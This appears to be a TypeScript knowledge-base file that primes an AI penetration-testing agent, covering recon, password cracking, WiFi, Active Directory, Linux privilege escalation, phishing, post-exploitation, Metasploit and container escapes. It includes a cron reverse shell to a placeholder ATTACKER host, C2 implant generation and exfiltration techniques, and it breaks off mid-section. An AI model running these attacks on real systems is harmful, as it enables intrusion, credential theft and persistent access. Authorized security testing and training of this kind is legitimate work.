// Rush Golden Seeds — The Breacher (Royal Guard)
// 21 knowledge seeds for authorized penetration testing and security operations
// All testing is authorized by the founder on owned infrastructure

export const RUSH_KNOWLEDGE_SEEDS: Record<string, { title: string; content: string }[]> = {
  "rush": [
    {
      title: "R-1: Network Reconnaissance & Discovery",
      content: `Network reconnaissance is the foundational phase of any penetration test. Rush begins every engagement by mapping the target environment — identifying live hosts, network topology, and attack surface before any exploitation attempt.

Host Discovery Techniques:
- ARP scanning (Layer 2): nmap -sn -PR 192.168.1.0/24 — fastest for local subnets, cannot be blocked by host firewalls since it operates below IP. Also use netdiscover -r 192.168.1.0/24 for passive/active ARP discovery.
- ICMP ping sweep: nmap -sn -PE 192.168.1.0/24 — classic but often filtered. Combine with TCP ACK (-PA) and UDP (-PU) probes for completeness.
- TCP SYN discovery: nmap -sn -PS22,80,443,3389 10.0.0.0/24 — SYN packets to common ports bypass ICMP-blocking firewalls.
- Passive discovery: netdiscover -p -r 192.168.1.0/24 — listen-only mode captures ARP broadcasts without generating traffic. Ideal for stealth.

Service Enumeration:
After host discovery, enumerate services on live hosts: nmap -sV -sC -O -p- <target>. The -sC flag runs default NSE scripts that pull banners, check for common misconfigs, and identify software versions. For targeted service enum: nmap --script=http-enum,smb-enum-shares,dns-brute <target>.

Network Topology Mapping:
Use traceroute combined with nmap's --traceroute flag to understand routing. Map VLANs, subnets, and gateway positions. On the OMEN network, identify Docker bridge networks (172.17.0.0/16), WSL2 virtual adapter (172.x.x.x), and the physical LAN segment.

DNS Reconnaissance:
Internal DNS enumeration with nmap --script dns-brute <domain>, zone transfer attempts with dig axfr @<nameserver> <domain>, and reverse DNS sweeps with nmap -sL 192.168.1.0/24 to identify hostnames.

OMEN-Specific Recon:
On the Palace network, key targets include: PostgreSQL on port 5432 (Docker, currently bound to 0.0.0.0), Redis on port 6379 (Docker, also 0.0.0.0), vLLM on port 8000 (WSL2), Nginx proxy on 8080, Grafana on 3001, Prometheus on 9090, and the Cloudflare tunnel endpoint. Document everything found — recon is only valuable if recorded.

Output Management:
Always save scan results: nmap -oA /path/to/scan-results <target>. The -oA flag outputs in all three formats (normal, XML, grepable). XML output feeds into tools like Metasploit's db_import and can be parsed programmatically.`
    },
    {
      title: "R-2: Port Scanning & Service Fingerprinting",
      content: `Port scanning determines which services are listening and accessible on target hosts. Fingerprinting identifies exact software versions, enabling precise vulnerability matching.

TCP Scan Types:
- SYN scan (half-open): nmap -sS <target> — default for root/admin. Sends SYN, reads SYN/ACK or RST, never completes handshake. Fast, relatively stealthy, and reliable.
- Connect scan: nmap -sT <target> — full TCP handshake. Used when SYN scan isn't available (non-root). Slower and logged by target.
- ACK scan: nmap -sA <target> — doesn't determine open/closed, but maps firewall rules. Unfiltered ports respond with RST; filtered ports drop or ICMP-reject.
- FIN/Xmas/Null scans: nmap -sF/-sX/-sN <target> — exploit RFC 793 behavior where closed ports RST and open ports stay silent. Effective against some stateless firewalls but unreliable on Windows (which RSTs everything).
- Window scan: nmap -sW <target> — like ACK scan but examines TCP window size in RST responses to distinguish open from closed on certain implementations.

UDP Scanning:
nmap -sU --top-ports 100 <target> — UDP is slow because no handshake means waiting for ICMP unreachable (closed) or silence (open|filtered). Speed up with --max-retries 1 --min-rate 1000. Key UDP services: DNS (53), SNMP (161/162), TFTP (69), NTP (123), DHCP (67/68).

Version Detection:
nmap -sV --version-intensity 5 <target> — probes open ports with protocol-specific queries to identify exact service versions. Intensity ranges 0-9; default 7 is thorough. For aggressive detection: nmap -sV --version-all. This is critical for CVE matching — knowing "Apache 2.4.49" vs just "HTTP" changes the entire attack plan.

OS Fingerprinting:
nmap -O --osscan-guess <target> — analyzes TCP/IP stack behavior (window size, TTL, DF bit, TCP options ordering) to identify OS. Requires at least one open and one closed port. Combine with -A for aggressive mode (OS + version + scripts + traceroute).

Timing & Evasion:
Timing templates: -T0 (paranoid, 5 min between probes) through -T5 (insane). For internal authorized testing, -T4 is standard. For IDS evasion testing: fragment packets with -f, use decoys with -D RND:5, spoof source with -S <ip>, or idle scan with -sI <zombie>.

Full Port Range:
Always scan all 65535 ports at least once: nmap -p- <target>. Services hiding on non-standard ports (web servers on 8443, SSH on 2222) are common. For speed: masscan -p1-65535 --rate=10000 <target> then follow up with nmap for version detection on discovered ports.`
    },
    {
      title: "R-3: Vulnerability Scanning & Assessment",
      content: `Vulnerability scanning bridges reconnaissance and exploitation. Rush uses automated scanners to identify known vulnerabilities, then validates findings manually to eliminate false positives.

Nuclei — The Primary Scanner:
Nuclei is template-based and fast. Run comprehensive scans with: nuclei -u https://target.com -t ~/nuclei-templates/ -severity critical,high,medium -o results.txt. Template categories: cves/, misconfigurations/, exposures/, default-logins/, vulnerabilities/. Update templates regularly: nuclei -ut. Custom templates follow YAML format — write them for Stone AI specific endpoints.

OpenVAS/GVM:
For authenticated vulnerability scanning, OpenVAS provides deep inspection. Set up scan configs targeting the OMEN network. Authenticated scans (SSH/SMB credentials) find significantly more vulnerabilities than unauthenticated — they can check installed package versions, registry entries, and file permissions. Run from Kali WSL or a dedicated scanning VM.

Nessus Essentials:
Free tier covers 16 IPs — sufficient for OMEN infrastructure. Nessus excels at compliance checks (CIS benchmarks, DISA STIGs) and has the most comprehensive plugin database. Export reports in .nessus XML for tracking remediations over time.

CVE Tracking & Intelligence:
Monitor CVE databases: NVD (nvd.nist.gov), Exploit-DB (exploit-db.com), and vendor advisories. For the OMEN stack, track CVEs affecting: PostgreSQL 16, Redis 7, Docker Engine, Nginx, Node.js/Next.js, Prisma, and the Linux kernel (WSL2). Use searchsploit from Kali to query the local Exploit-DB mirror: searchsploit postgresql 16.

Vulnerability Validation:
Never trust scanner output blindly. Validate critical/high findings manually: attempt the exploit in a controlled way, check if the vulnerable code path is reachable, verify the version is actually affected. False positive rate on automated scanners is typically 15-30%.

CVSS Scoring:
Understand CVSS v3.1 metrics: Attack Vector (Network/Adjacent/Local/Physical), Attack Complexity (Low/High), Privileges Required (None/Low/High), User Interaction (None/Required), Scope (Unchanged/Changed), plus CIA impact (None/Low/High). A network-accessible, no-auth, low-complexity RCE with scope change is CVSS 10.0. Use CVSS as a prioritization tool, not gospel — context matters more than scores.

Continuous Assessment:
Schedule regular scans. Weekly Nuclei runs against web endpoints, monthly OpenVAS full scans, and immediate scans after any infrastructure change. Track findings in a spreadsheet or ticketing system with: finding, severity, affected host, discovery date, remediation status, verification date.`
    },
    {
      title: "R-4: Web Application Penetration Testing",
      content: `Web application pentesting targets the Stone AI web platform and its API surface. Rush tests against the OWASP Top 10 and beyond, focusing on the specific technology stack (Next.js, Clerk auth, Stripe billing).

OWASP Top 10 (2021) Testing Checklist:
1. Broken Access Control (A01): Test for IDOR — can user A access user B's conversations by changing IDs in URLs/API calls? Test horizontal and vertical privilege escalation. Check every API route for proper auth middleware.
2. Cryptographic Failures (A02): Verify AES-256-GCM implementation for sensitive data. Check TLS configuration. Ensure no sensitive data in URLs, logs, or error messages.
3. Injection (A03): SQL injection via Prisma is unlikely (parameterized queries) but test raw query usage. Test for NoSQL injection, command injection, template injection (Next.js server components), and LDAP injection.
4. Insecure Design (A04): Review business logic — can users bypass tier restrictions? Can free users access SMART-tier agents? Are rate limits enforced?
5. Security Misconfiguration (A05): Check headers (CSP, HSTS, X-Frame-Options). Test for default credentials on admin panels. Verify error pages don't leak stack traces.
6. Vulnerable Components (A06): Run npm audit and check for known CVEs in dependencies.
7. Auth Failures (A07): Test Clerk integration — session handling, token expiration, multi-device logout.
8. Data Integrity (A08): Check for insecure deserialization. Verify Zod .strict() validation on all mutation endpoints.
9. Logging Failures (A09): Verify security events are logged (failed logins, auth failures, input validation failures).
10. SSRF (A10): Test any URL-fetching functionality. Can avatar URLs trigger internal network requests?

Burp Suite Workflow:
Configure browser proxy to Burp (127.0.0.1:8080). Spider the application to map all endpoints. Use Intruder for parameter fuzzing, Repeater for manual request crafting. Enable passive scanning for background vulnerability detection. Save project files for regression testing.

Testing Next.js Specifics:
Test server actions for CSRF. Check API route middleware ordering. Test _next/data endpoints for data leakage. Verify middleware.ts properly protects all authenticated routes. Test for path traversal in dynamic routes ([...slug]).`
    },
    {
      title: "R-5: API Security Testing",
      content: `API security testing covers the 47 API route directories in Stone AI. Rush systematically tests authentication, authorization, input validation, and business logic across REST endpoints.

Authentication Testing:
- Test endpoints without auth headers — every authenticated route must return 401, not 200 with empty data.
- Test with expired Clerk tokens — verify proper expiration handling.
- Test with malformed JWTs — tamper with payload, use none algorithm attack, modify claims.
- Test API key endpoints (if any) — key rotation, revocation, scope enforcement.

Authorization Testing (Broken Access Control):
- IDOR testing: Enumerate conversation IDs, agent IDs, user IDs. Attempt cross-tenant access. Use Burp Intruder to automate ID permutation.
- Vertical privilege escalation: Can a FREE tier user call SMART tier endpoints? Can a regular user access /api/admin/* routes?
- Function-level auth: Test each API route independently. Auth middleware must be present on every route, not just assumed from layout.

Input Validation & Injection:
- Fuzz all parameters with: special characters, oversized inputs (1MB strings), null bytes, Unicode edge cases, nested objects beyond expected depth.
- GraphQL-specific (if applicable): introspection queries, query depth attacks, batch query abuse, field suggestion enumeration.
- Test Zod validation: Send payloads with extra fields (should be rejected by .strict()), wrong types, missing required fields, boundary values.

Rate Limiting:
Test with tools like hey or custom scripts: hey -n 1000 -c 50 https://app.stone-ai.net/api/chat. Verify rate limits are per-user (not per-IP, which fails behind NAT). Test rate limit bypass via header manipulation (X-Forwarded-For, X-Real-IP).

Business Logic Testing:
- Billing bypass: Can users access paid features without valid subscriptions? Test race conditions in subscription status checks.
- Quota bypass: Can users exceed message quotas by rapid-firing requests? Test concurrent request handling.
- Agent access: Verify tier-based agent access control. A STARTER user should not reach a SMART-tier agent.
- Stripe webhook security: Verify webhook signature validation. Test with replayed webhook payloads.

Response Analysis:
- Check for sensitive data leakage in responses (internal IDs, stack traces, database errors, user PII).
- Verify proper HTTP status codes (401 vs 403 vs 404 — don't reveal resource existence to unauthorized users).
- Check CORS headers — ensure only allowed origins can make cross-origin requests.`
    },
    {
      title: "R-6: Password Attacks & Credential Testing",
      content: `Credential attacks test the strength of authentication mechanisms across the OMEN infrastructure — SSH, database connections, web logins, Docker registries, and service accounts.

Online Attacks (Network Services):
- Hydra for SSH: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.x -t 4 -V
- Hydra for PostgreSQL: hydra -l stoneai -P wordlist.txt postgres://192.168.1.x:5432
- Hydra for web forms: hydra -l admin -P wordlist.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
- Medusa for parallel attacks: medusa -h target -u admin -P wordlist.txt -M ssh -t 3
- Patator for flexible protocol support: patator ssh_login host=target user=admin password=FILE0 0=wordlist.txt

Offline Attacks (Hash Cracking):
- Extract hashes from: /etc/shadow (Linux), SAM database (Windows), database dumps, captured network traffic.
- John the Ripper: john --wordlist=rockyou.txt --rules=jumbo hashes.txt — rules engine generates permutations (capitalize, append numbers, leet speak).
- Hashcat with GPU: hashcat -m 0 -a 0 hashes.txt rockyou.txt -O — mode 0 is MD5, use appropriate mode for hash type. The RTX 5090 in the OMEN is excellent for hashcat — 32GB VRAM handles massive rule sets. Key modes: 1000 (NTLM), 1800 (sha512crypt), 3200 (bcrypt), 13100 (Kerberos TGS-REP).
- Hashcat mask attack: hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?d?d?d?d — brute force with pattern (uppercase + 3 lowercase + 4 digits).

Password Spraying:
Instead of many passwords against one account (triggers lockout), spray one password against many accounts: crackmapexec smb target -u users.txt -p 'Summer2026!' --continue-on-success. Effective against AD environments where lockout thresholds are configured.

Wordlist Management:
- RockYou: 14 million passwords from the 2009 breach. Starting point for all attacks.
- SecLists: Curated wordlists at /usr/share/seclists/Passwords/. Includes leaked databases, common patterns, by-language lists.
- CeWL: cewl https://stone-ai.net -d 2 -m 5 -w custom-wordlist.txt — crawl the target site to build context-specific wordlists.
- Custom rules: Combine company name, year, seasons, common patterns. "StoneAI2026!", "stone_ai#1", "S7oneAI!" — test these first.

Credential Stuffing:
Test if credentials leaked in other breaches work on Stone AI. Tools: credmap, custom Python scripts. Mitigations to verify: account lockout, CAPTCHA after failures, breach password checking (HaveIBeenPwned API integration).`
    },
    {
      title: "R-7: Wireless Network Security",
      content: `Wireless security testing covers the OMEN's local WiFi network and any connected IoT devices. Rush tests encryption strength, access control, and rogue access point detection.

WiFi Reconnaissance:
Put the wireless adapter in monitor mode: airmon-ng start wlan0. Scan for networks: airodump-ng wlan0mon — captures BSSIDs, channels, encryption types (WPA2/WPA3), connected clients, signal strength. Target the home network specifically — never test networks you don't own.

WPA2-PSK Attacks:
1. Capture the 4-way handshake: airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon
2. Force a handshake by deauthenticating a client: aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
3. Crack offline with hashcat: hashcat -m 22000 capture.hc22000 rockyou.txt (mode 22000 for PMKID/handshake). The RTX 5090 handles WPA cracking efficiently.
4. Alternative: aircrack-ng -w rockyou.txt capture-01.cap

WPA3 Considerations:
WPA3 uses SAE (Simultaneous Authentication of Equals) — Dragonfly handshake replaces PSK's 4-way handshake. Side-channel attacks (Dragonblood, CVE-2019-9494/9496) may work on older implementations. WPA3 transition mode (backward compatible with WPA2) is vulnerable if WPA2 clients connect — downgrade attacks are possible.

PMKID Attack:
Faster than waiting for handshake: hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=<AP_MAC> --filtermode=2 --enable_status=3. Extract PMKID without any client interaction. Convert and crack: hcxpcapngtool pmkid.pcapng -o hash.hc22000 && hashcat -m 22000 hash.hc22000 rockyou.txt.

Evil Twin Attacks:
Create a rogue AP mimicking the target network using hostapd-mana or fluxion. Clients connect to the stronger signal, allowing credential capture and traffic interception. Use for awareness testing — demonstrates why certificate pinning and VPNs matter.

Deauthentication Attacks:
aireplay-ng -0 0 -a <AP_MAC> wlan0mon — continuous deauth forces all clients off the network. Tests AP resilience and client reconnection behavior. Management Frame Protection (802.11w/PMF) mitigates this — verify it's enabled.

Rogue AP Detection:
Use airodump-ng to periodically scan for unknown APs on the network. Compare against known BSSID list. Alert on new APs, especially those mimicking the legitimate SSID.

Post-WiFi Compromise:
Once on the network: ARP scan to discover hosts, check for network segmentation (are IoT devices on a separate VLAN?), test for lateral movement opportunities. Document WiFi password strength and rotation policy.`
    },
    {
      title: "R-8: Active Directory & Windows Network Attacks",
      content: `Active Directory testing is relevant for enterprise environments and understanding Windows security. On the OMEN, Rush tests local Windows security and simulates AD attack chains for knowledge readiness.

Enumeration:
- BloodHound: bloodhound-python -u user -p pass -d domain.local -c all — collects AD relationships (group memberships, admin access, ACLs, sessions) and visualizes attack paths. The SharpHound collector runs on Windows targets.
- LDAP enumeration: ldapsearch -x -H ldap://DC -b "dc=domain,dc=local" "(objectclass=user)" — pull user lists, groups, OUs, computer objects.
- Enum4linux-ng: enum4linux-ng -A target — comprehensive SMB/NetBIOS/LDAP enumeration.
- CrackMapExec (NetExec): nxc smb target -u user -p pass --shares --users --groups — Swiss army knife for AD pentesting.

Kerberos Attacks:
- AS-REP Roasting: GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP — targets accounts with "Do not require Kerberos pre-auth" set. Crack retrieved AS-REP hashes with hashcat mode 18200.
- Kerberoasting: GetUserSPNs.py domain.local/user:pass -dc-ip DC_IP -request — requests TGS tickets for service accounts and cracks them offline. Hashcat mode 13100. Service accounts often have weak passwords.
- Golden Ticket: With the KRBTGT hash, forge TGTs for any user. ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain domain.local Administrator. Grants domain admin until KRBTGT password is rotated (twice).
- Silver Ticket: Forge TGS for specific services without touching the DC. Requires service account hash.

Pass-the-Hash / Pass-the-Ticket:
- PtH: nxc smb target -u admin -H <NTLM_hash> — authenticate with NTLM hash without knowing the password. Works because NTLM authentication only validates the hash.
- PtT: export KRB5CCNAME=/path/to/ticket.ccache && psexec.py -k domain.local/admin@target — use stolen Kerberos tickets.
- Overpass-the-Hash: Convert NTLM hash to Kerberos ticket: getTGT.py domain.local/user -hashes :NTLM_HASH.

Privilege Escalation:
- Token impersonation: incognito.exe list_tokens -u then impersonate a higher-privilege token.
- Print Spooler abuse (PrintNightmare): Force DC to authenticate to attacker-controlled host.
- ADCS abuse: Misconfigured certificate templates allow domain escalation (Certifried, ESC1-ESC8).
- ACL abuse: WriteDACL, GenericAll, GenericWrite on user/group objects allows resetting passwords or adding group members.

Lateral Movement:
PsExec, WMI, WinRM, DCOM, SMB. Each leaves different forensic artifacts. PsExec creates a service, WMI runs via WMI provider, WinRM uses HTTP/S on 5985/5986.`
    },
    {
      title: "R-9: Linux/Unix Penetration Testing",
      content: `Linux penetration testing focuses on the WSL2 Ubuntu environment, Docker containers, and any Linux hosts on the network. Rush tests privilege escalation paths, container escapes, and Unix-specific vulnerabilities.

Privilege Escalation Enumeration:
Automated tools first: linpeas.sh (comprehensive), linux-exploit-suggester.sh (kernel exploits), pspy (process monitoring without root). Upload via curl or wget from attacker server, run from /tmp or /dev/shm.

SUID/SGID Exploitation:
Find SUID binaries: find / -perm -4000 -type f 2>/dev/null. Check each against GTFOBins (gtfobins.github.io) — many standard tools can escalate when SUID: find, vim, python, nmap, bash, cp, env. Example: If find has SUID: find . -exec /bin/sh -p \\;.

Cron Job Abuse:
Enumerate cron: crontab -l, ls -la /etc/cron*, cat /etc/crontab, systemctl list-timers. Look for: writable scripts called by root cron, wildcard injection opportunities (tar with --checkpoint-action), PATH manipulation where cron PATH differs from user PATH.

Writable Files & Directories:
- World-writable files owned by root: find / -writable -user root -type f 2>/dev/null
- Writable /etc/passwd: Add a new root user entry.
- Writable systemd service files: Modify ExecStart to inject commands.
- Writable libraries: LD_PRELOAD or library path injection.

Kernel Exploits:
Check kernel version: uname -r. Search for exploits: searchsploit linux kernel <version>. Common recent exploits: DirtyPipe (CVE-2022-0847, kernels 5.8-5.16), DirtyCow (CVE-2016-5195, older kernels), GameOver(lay) (CVE-2023-2640). WSL2 runs a Microsoft-modified kernel — check its version separately.

Capabilities:
getcap -r / 2>/dev/null — Linux capabilities are finer-grained than SUID. Dangerous capabilities: cap_setuid (set UID), cap_net_raw (raw sockets), cap_dac_override (bypass file permissions), cap_sys_admin (mount, ptrace, many more). Python with cap_setuid: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'.

Container Escape (from Docker):
- Check if you're in a container: cat /proc/1/cgroup, look for .dockerenv, check hostname.
- Privileged container: mount /dev/sda1 /mnt && chroot /mnt — full host access.
- Docker socket mounted: docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
- Capabilities abuse: cap_sys_admin allows mount, enabling escape via cgroup release_agent.

SSH Key Harvesting:
Check ~/.ssh/, /root/.ssh/, /home/*/.ssh/ for private keys. Check authorized_keys for leads to other hosts. Check SSH config for ProxyJump/ProxyCommand chains revealing internal hosts.`
    },
    {
      title: "R-10: Social Engineering Frameworks",
      content: `Social engineering testing validates human security awareness. Rush builds and executes phishing campaigns, pretexting scenarios, and awareness tests for the Stone AI team — all authorized and educational.

Phishing Campaign Setup:
- GoPhish: Open-source phishing framework. Configure SMTP sending profile (use authorized test domain, never impersonate external organizations). Create landing pages that clone login portals. Track: email opens, link clicks, credential submissions, reporting rates.
- Campaign design: Craft emails mimicking common attack vectors — password reset requests, invoice attachments, meeting invites, IT notifications. Vary sophistication levels to test different awareness thresholds.

Email Phishing Techniques:
- Homograph attacks: Use lookalike domains (st0ne-ai.net vs stone-ai.net). Register typosquatting domains for testing.
- HTML email tricks: Hover-text mismatch (displayed URL differs from href), invisible tracking pixels, embedded forms.
- Attachment payloads: Macro-enabled documents (.xlsm, .docm), HTA files, LNK shortcuts pointing to remote payloads. For awareness testing, use benign payloads that phone home without executing anything harmful.
- SPF/DKIM/DMARC bypass: Test if the organization's email infrastructure properly validates sender authenticity. Check with: dig txt stone-ai.net, dig txt _dmarc.stone-ai.net.

Pretexting Scenarios:
Pretexting is creating a fabricated scenario to extract information or access. Common pretexts for testing:
- IT support: "We're migrating systems, I need you to verify your credentials on this portal."
- Executive request: "CEO needs this file sent to this address urgently." (Business Email Compromise simulation)
- Vendor/partner: "We're updating our integration, can you provide API keys?"
- Physical: "I'm from the printer company, here to service the device." (for on-site testing)

Vishing (Voice Phishing):
Phone-based social engineering. Call with a pretext, attempt to extract credentials or get the target to perform actions (install software, visit URL, share screen). Record calls (with consent/authorization) for training purposes.

USB Drop Testing:
Place USB drives in common areas with tracking payloads (Rubber Ducky scripts, autorun callbacks). Tracks: who plugged it in, when, which machine. Demonstrates physical vector risks.

Metrics & Reporting:
Track click rates, submission rates, reporting rates across campaigns. Benchmark against industry averages (typically 10-30% click rate on first campaign). Show improvement over successive campaigns. The goal is education, not punishment — use results to build targeted security awareness training.

SE Kill Chain:
1. OSINT gathering on target 2. Pretext development 3. Attack vector selection 4. Campaign execution 5. Data collection 6. Analysis & reporting 7. Awareness training delivery`
    },
    {
      title: "R-11: Post-Exploitation & Lateral Movement",
      content: `Post-exploitation begins after initial access. Rush establishes persistence, moves laterally through the network, and demonstrates the full impact of a breach — all on authorized infrastructure.

Establishing Persistence:
- Cron/scheduled tasks: Add persistent reverse shell via cron: (crontab -l; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'") | crontab -
- SSH keys: Add attacker's public key to ~/.ssh/authorized_keys — silent, survives password changes.
- Systemd service: Create a service that spawns a reverse shell on boot. Place in /etc/systemd/system/.
- Windows: Registry Run keys, scheduled tasks, WMI event subscriptions, DLL hijacking, service creation.
- Web shells: Drop a PHP/JSP/ASPX shell in the web root. Obfuscate to evade detection.

Pivoting & Tunneling:
- SSH tunneling: ssh -L 8080:internal-host:80 user@jumpbox (local forward), ssh -R 9090:localhost:22 user@attacker (reverse forward), ssh -D 1080 user@jumpbox (dynamic SOCKS proxy).
- Chisel: chisel server -p 8000 --reverse (attacker), chisel client ATTACKER:8000 R:socks (target) — creates a SOCKS proxy through the compromised host. Excellent for pivoting through segmented networks.
- Ligolo-ng: Modern tunneling tool, creates TUN interfaces. Simpler than SSH tunnels for multi-hop pivoting.
- Metasploit autoroute: run post/multi/manage/autoroute then use auxiliary/server/socks_proxy — route traffic through Meterpreter sessions.

Lateral Movement Techniques:
- Network: PSExec, WMI, WinRM, SSH, RDP with stolen credentials.
- File shares: Mount SMB shares, search for credentials in scripts, configs, documents.
- Database pivoting: Use database access to read credentials, execute OS commands (xp_cmdshell in MSSQL, COPY TO PROGRAM in PostgreSQL).
- Application pivoting: Use web application access to reach internal services not directly accessible.

C2 Frameworks:
- Sliver: Open-source C2 by BishopFox. Supports HTTP/S, DNS, mTLS, WireGuard. Generates implants for Windows/Linux/macOS. sliver > generate --http ATTACKER --os linux --arch amd64 -s /tmp/implant.
- Mythic: Modular C2 with web UI. Supports multiple agent types (Apollo for Windows, Poseidon for Linux).
- Cobalt Strike: Commercial, industry standard. Malleable C2 profiles mimic legitimate traffic.

Data Exfiltration:
- DNS exfiltration: Encode data in DNS queries to attacker-controlled domain.
- HTTP/S: Blend with normal web traffic. Upload to attacker-controlled server or cloud storage.
- Steganography: Hide data in images.
- Slow exfil: Trickle data out over days/weeks to avoid detection.
- Validate DLP controls: Can the organization detect and block data leaving the network?`
    },
    {
      title: "R-12: Metasploit Framework Mastery",
      content: `Metasploit is the most comprehensive exploitation framework. Rush uses it as the primary exploitation platform for authorized testing on the OMEN infrastructure.

Core Architecture:
- msfconsole — primary interface. Database-backed (PostgreSQL). Initialize with msfdb init.
- Modules: exploit/ (active exploitation), auxiliary/ (scanning, fuzzing, enumeration), post/ (post-exploitation), payload/ (code to run on target), encoder/ (obfuscation), nop/ (NOP sled generators).
- Workspaces: workspace -a omen-test — separate findings by engagement.

Exploitation Workflow:
1. msfconsole
2. db_nmap -sV -sC -O 192.168.1.0/24 — Scan and import results
3. hosts — View discovered hosts
4. services — View discovered services
5. vulns — View discovered vulnerabilities
6. search type:exploit platform:linux postgres — Find relevant exploits
7. use exploit/linux/postgres/postgres_payload
8. set RHOSTS, RPORT, USERNAME, PASSWORD
9. check — Verify vulnerability without exploiting
10. exploit — Launch exploit

Payload Selection:
- Staged vs stageless: windows/meterpreter/reverse_tcp (staged, smaller initial payload, pulls full payload from handler) vs windows/meterpreter_reverse_tcp (stageless, entire payload in one shot, more reliable through restrictive firewalls).
- Meterpreter: Full-featured payload — file operations, keylogging, screenshots, pivoting, process migration. Commands: sysinfo, hashdump, getsystem, portfwd add -l 3389 -p 3389 -r internal-host.
- Shell payloads: Simple command shells for minimal footprint. linux/x64/shell_reverse_tcp.

Key Auxiliary Modules:
- auxiliary/scanner/portscan/tcp — built-in port scanner
- auxiliary/scanner/smb/smb_enumshares — SMB share enumeration
- auxiliary/scanner/http/dir_scanner — web directory brute force
- auxiliary/scanner/ssh/ssh_enumusers — SSH user enumeration
- auxiliary/server/capture/http_basic — capture HTTP basic auth credentials

Post-Exploitation Modules:
- post/multi/gather/ssh_creds — harvest SSH credentials
- post/linux/gather/enum_configs — collect config files
- post/linux/gather/hashdump — dump password hashes
- post/multi/manage/shell_to_meterpreter — upgrade shell to Meterpreter
- post/multi/manage/autoroute — set up pivoting routes

Resource Scripts:
Automate common tasks with .rc files. Create auto_scan.rc with db_nmap, service filtering, and module execution. Run: msfconsole -r auto_scan.rc.

Database Management:
db_import scan.xml imports nmap/Nessus/OpenVAS results. creds lists harvested credentials. loot shows exfiltrated data. Use db_export to save workspace data between sessions.`
    },
    {
      title: "R-13: Network Protocol Attacks",
      content: `Network protocol attacks target the communication layers. Rush tests for protocol-level weaknesses on the OMEN network — ARP, DNS, DHCP, and transport layer vulnerabilities.

ARP Spoofing/Poisoning:
ARP is stateless and unauthenticated on local networks. Attack: arpspoof -i eth0 -t <victim> <gateway> or ettercap -T -q -M arp:remote /<victim>// /<gateway>//. This positions the attacker as man-in-the-middle for all victim traffic. The attacker sees all unencrypted traffic and can modify packets in transit.

Mitigation testing: Check if switches have Dynamic ARP Inspection (DAI) enabled. Verify static ARP entries on critical systems: arp -s <gateway_ip> <gateway_mac>.

DNS Attacks:
- DNS spoofing: ettercap with dns_spoof plugin or dnsspoof -i eth0 -f hosts.txt. Redirect DNS queries to attacker-controlled IPs. Tests: Does the victim validate DNSSEC? Are DNS responses authenticated?
- DNS cache poisoning: Target recursive resolvers to cache malicious records. Kaminsky attack variant — flood the resolver with forged responses before the legitimate answer arrives.
- DNS tunneling: iodine -f <attacker-domain> <server-ip> — tunnel IP traffic over DNS queries. Bypasses most network restrictions since DNS (port 53) is almost always allowed. Detection: Monitor for abnormally large DNS queries, high query volume, or unusual TXT/NULL record types.

Man-in-the-Middle (MITM):
- Bettercap: bettercap -iface eth0 then: net.probe on, set arp.spoof.targets <victim>, arp.spoof on, net.sniff on. Bettercap is the modern replacement for ettercap — scriptable, extensible, with a web UI.
- SSL/TLS stripping: bettercap with set http.proxy.sslstrip true — downgrades HTTPS to HTTP for victims. Tests HSTS enforcement and certificate pinning. HSTS preload list and HSTS headers mitigate this — verify they're configured for stone-ai.net.
- SSL interception: Use mitmproxy or Burp Suite as transparent proxy. Install CA certificate on test devices. Inspect encrypted traffic for sensitive data leakage.

DHCP Attacks:
- DHCP starvation: yersinia -I — flood DHCP server with requests from random MACs, exhausting the IP pool. Tests DHCP server resilience and port security.
- Rogue DHCP: Set up a malicious DHCP server that hands out attacker-controlled gateway and DNS. Clients automatically route through attacker.

VLAN Hopping:
- Switch spoofing: Configure attacker interface as trunk port (DTP negotiation). yersinia -G or manual DTP frame crafting.
- Double tagging: Encapsulate frames with two 802.1Q tags — outer tag matches native VLAN, inner tag is target VLAN. Only works one way (attacker to target) and requires native VLAN misconfiguration.

Protocol-Level Defenses to Verify:
802.1X port authentication, port security (MAC limiting), DHCP snooping, DAI, IP Source Guard, private VLANs, storm control. Check which of these are configured on the OMEN network infrastructure.`
    },
    {
      title: "R-14: Docker & Container Security Testing",
      content: `Docker container security is critical for the OMEN infrastructure — PostgreSQL and Redis run as Docker containers. Rush tests container isolation, image security, and runtime protections.

Container Enumeration:
From the host: docker ps -a (running and stopped containers), docker images (local images), docker inspect <container> (full config including mounts, network, capabilities), docker logs <container> (application logs — may contain credentials).

Known OMEN Issues:
- PostgreSQL bound to 0.0.0.0:5432 — accessible from any network interface, including external. Must rebind to 127.0.0.1.
- Redis bound to 0.0.0.0:6379 — same issue. Redis without auth is an RCE vector (SLAVEOF, MODULE LOAD, write SSH keys via CONFIG SET dir).
- Docker Desktop firewall rule allows all inbound TCP/UDP — overly permissive.

Image Security Scanning:
- Trivy: trivy image postgres:16 — scans for CVEs in OS packages and language dependencies. Fast, accurate, regularly updated.
- Grype: grype postgres:16 — Anchore's vulnerability scanner. Good for CI/CD integration.
- Docker Scout: docker scout cves postgres:16 — built into Docker Desktop.
- Check for: base image vulnerabilities, outdated packages, hardcoded credentials in image layers, unnecessary packages increasing attack surface.

Container Escape Techniques:
- Privileged containers: docker run --privileged grants all capabilities, access to host devices, and disables seccomp/AppArmor. Escape: mount host filesystem, access host PID namespace, load kernel modules.
- Docker socket exposure: If /var/run/docker.sock is mounted inside the container, it's game over — create a new privileged container with host mounts. Check: ls -la /var/run/docker.sock.
- Capability abuse: Excessive capabilities like SYS_ADMIN, SYS_PTRACE, NET_ADMIN enable various escapes. Check: capsh --print inside container.
- Kernel exploits: Container shares kernel with host. Kernel vulnerability = container escape. CVE-2022-0185 (fsconfig), CVE-2022-0847 (DirtyPipe).

Runtime Security:
- Seccomp profiles: Restrict syscalls available to containers. Default Docker profile blocks approximately 44 of 300+ syscalls. Custom profiles for tighter restrictions.
